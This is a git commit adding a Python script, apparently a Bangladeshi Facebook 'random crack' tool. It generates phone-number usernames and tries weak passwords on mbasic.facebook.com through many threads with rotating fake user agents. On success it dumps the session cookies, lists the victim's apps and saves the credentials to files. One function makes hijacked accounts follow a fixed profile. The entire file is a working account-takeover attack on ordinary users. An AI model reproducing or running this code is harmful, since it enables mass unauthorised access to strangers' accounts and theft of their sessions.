a6ff6da9b284a3ed0117388399810f58c4de2650
HAMIM-404 <137391168+HAMIM-404@users.noreply.github.com>
2023-09-02 21:36:06 +0600

    Add files via upload

---
+++ ua2.py
@@ -0,0 +1,302 @@
+#-------------------------------------------------------------
+#Don't Forget To Follow My Github &
+#Sent Star This Repositories 🙂
+#-------------------------------------------------------------
+#10K-Gift-Test-Coding
+#!/usr/bin/python3
+#-*-coding:utf-8-*-
+import os,sys,time,json,random,re,string,platform,base64,uuid
+os.system("git pull")
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+#-----[Global Functions]-----#
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
+#-----[Colours]-----#
+RED = '\033[1;91m' #
+WHITE = '\033[1;97m' #
+GREEN = '' #
+YELLOW = '\033[1;33m' #
+BLUE = '\033[1;34m' #
+ORANGE = '\033[1;35m' #
+P = '\x1b[1;97m' # 
+M = '\x1b[1;91m' # 
+H = '\x1b[1;92m' # 
+K = '\x1b[1;92m' # 
+B = '\x1b[1;94m' # 
+U = '\x1b[1;95m' # 
+O = '\x1b[1;96m' #
+N = '\x1b[0m' #
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+mtd,cp_cpx,cokix=[],[],[]
+ugen2=[]
+ugen=[]
+#-----[App Checker]-----#
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
+    else:
+        print(f'\r[😍] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #else:
+            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
+    else:
+        print(f'\r[🥵] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('')
+
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://mbasic.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
+           
+#-----[UserAgent]-----#
+
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; U; Android'
+	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14'])
+	c='fr-fr'
+	d=random.choice(['SM-M305F','SM-M305FN','SM-M305G','SM-M305M','SM-A3051','SM-A3058','SM-A3050'])
+	y='Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	e=random.randrange(1,99)
+	f='0'
+	g=random.randrange(1,4200)
+	h=random.randrange(1,140)
+	i='Mobile Safari/537.36'
+	j='PHX/12.2'
+	uaku2=f'{a} {b}; {c}; {d} {y}{e}.{f}.{g}.{h} {i} {j}'
+	ugen.append(uaku2)
+	
+for ua in range(1000):
+	a='Mozilla/5.0 (Mobile; Nokia_2720_Flip'
+	b=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L',',M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
+	c=random.randrange(1,50)
+	d='0'
+	e=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L',',M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
+	f='Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2'
+	uaku2=f'{a}; {b}:{c}.{d}; {e} {f}'
+	ugen.append(uaku2)
+         
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.001)
+#-----[Logo]-----#
+logo = ("""    
+\033[1;37m   ##     ##    ###    ##     ## ##     ## 
+   ##     ##   ## ##   ###   ### ##     ## 
+   ##     ##  ##   ##  #### #### ##     ## 
+   ######### ##     ## ## ### ## ##     ## 
+   ##     ## ######### ##     ## ##     ## 
+   ##     ## ##     ## ##     ## ##     ## 
+   ##     ## ##     ## ##     ##  #######  
+--------------------------------------------------
+[•]CREATED BY     : \033[1;92mHAMIM FARABI\033[1;37m
+[•]FACEBOOK       : \033[1;92mHAMIM ON PIRE\033[1;37m
+[•]VERSION        : \033[1;31m0.0.1\033[1;37m
+--------------------------------------------------
+[•] \033[1;37m  WELCOME TO HAMIM TOOL  "\033[1;37m
+--------------------------------------------------""")
+try:
+   print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
+   v = 5.2
+   update = ('5.2')
+   update = ('5.2')
+   if str(v) in update:
+       os.system('clear')
+   else:pass
+except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')
+
+def linex():
+        print('\033[1;37m--------------------------------------------------')
+ 
+def clear():
+    os.system('clear')
+    print(logo)
+    
+#-----[Loop Menu]-----#  
+loop = 0
+oks = []
+cps = []
+
+#-----[Main-Menu]-----#
+def mumit_menu():
+    os.system('clear');print(logo)
+    print('[1] RANDOM CRACK')
+    print('[0] EXIT TOOL')
+    linex()
+    mumit=input('[?] SELECT MENU: ')
+    if mumit in['1','01']:innocent()
+    elif mumit in['0','00']:exit()
+    else:exit()
+    
+def innocent():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print('[√] BD CODE : 017/019/016/018/013')
+    linex()
+    code = input(' [?] CHOOSE : ')
+    os.system('clear')
+    print(logo)
+    print('[√] EXAMPLE : 3000/5000/10000/50000')
+    linex()
+    limit = int(input('[?] CHOOSE : '))
+    linex()
+    xd_cp=input(f' [?] You Want To Show Cp Account?[Y\033[1;34m/\033[1;31mN]: ')
+    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
+    else:cp_cpx.append('n')
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=50) as ahare:
+        clear()
+        tl = str(len(user))
+        print('\033[1;97m[+] Total ids: '+tl)
+        print('\033[1;97m[+] Process has been started')
+        print('\033[1;97m[!] Wait for ids ')
+        print('\033[1;97m[!] Use flight mode for speed up ')
+        linex()
+        for fuck in user:
+            pwx = [fuck,'bangladesh']
+            uid = code+fuck
+            ahare.submit(mumitx,uid,pwx,tl)
+    print('CRACK PROCESS HAS BEEN COMPLETED ')
+    print('Ok Ids Saved in /INNOCENT-OK.txt')
+    print('Cp Ids Saved in /INNOCENT-CP.txt')
+    linex()
+    
+def mumitx(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+		    'method':'POST',
+    		'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
+		    'scheme':'https',
+   		 'accept': '*/*',
+   		 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+		    'accept-language': 'en-US,en;q=0.9',
+		    'cache-control': 'max-age=0',
+		    # 'cookie': 'sb=DILcZAoP2yArAf-vKhipN4CJ; datr=EILcZJjbWUg8_DMSYK0P8Kt2; wd=980x1818; fr=077DjlgD2Zk2sx4U3..Bk3IIM.PC.AAA.0.0.Bk3b6F.AWUyWST3gU8',
+		    'dpr': '2',
+		    'sec-ch-prefers-color-scheme': 'light',
+		    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
+  		  'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5792.224", "Google Chrome";v="116.0.5792.224"',
+ 		   'sec-ch-ua-mobile': '?0',
+		    'sec-ch-ua-model': '"RMX3201"',
+  		  'sec-ch-ua-platform': '"macOS"',
+		    'sec-ch-ua-platform-version': '""',
+		    'sec-fetch-dest': 'document',
+ 		   'sec-fetch-mode': 'navigate',
+		    'sec-fetch-site': 'none',
+ 		   'sec-fetch-user': '?1',
+		    'upgrade-insecure-requests': '1',
+ 		   'user-agent': pro,
+		    'viewport-width': '980',}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\r\r\033[1;32m(Cracked) ' +uid+ ' | ' +ps+ ' \033[0;97m')
+                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
+                cek_apk(session,coki)
+                open('/sdcard/cracked-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                if 'y' in cp_cpx: 
+                 print('\r\r\033[1;31m(checkpoint)  ' +uid+ ' | ' +ps+ ' \033[0;97m')
+                open('/sdcard/HAMU-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write('\r\r%s\033[0;97m(\033[0;96mCracking\033[0;97m)  (\033[0;94m%s/%s\033[0;97m)  (\033[0;92mOK\033[0;97m:\033[0;92m%s\033[0;97m)'%(H,loop,tl,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+
+#-----[Run Menu]-----#
+mumit_menu()
